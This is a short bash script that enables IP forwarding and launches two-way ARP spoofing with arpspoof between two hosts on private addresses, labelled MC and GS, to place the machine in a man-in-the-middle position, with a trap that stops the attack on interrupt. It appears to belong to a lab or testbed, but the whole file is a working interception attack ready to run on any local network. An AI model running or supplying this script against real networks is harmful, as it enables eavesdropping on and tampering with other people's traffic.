#!/usr/bin/env bash
set -euo pipefail

IFACE="${1:-eth1}"

MC_IP="192.168.10.20"
GS_IP="192.168.10.30"

#Enables IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

echo "Starting ARP spoofing between $MC_IP and $GS_IP on $IFACE"

#ARP spoofing on MC, changing GS MAC
sudo arpspoof -i "$IFACE" -t "$MC_IP" "$GS_IP" &
PID1=$!

#ARP spoofing on GS, changing MC MAC
sudo arpspoof -i "$IFACE" -t "$GS_IP" "$MC_IP" &
PID2=$!

trap 'echo "Stopping MITM"; sudo kill $PID1 $PID2 2>/dev/null || true; sudo sysctl -w net.ipv4.ip_forward=0' INT TERM

wait
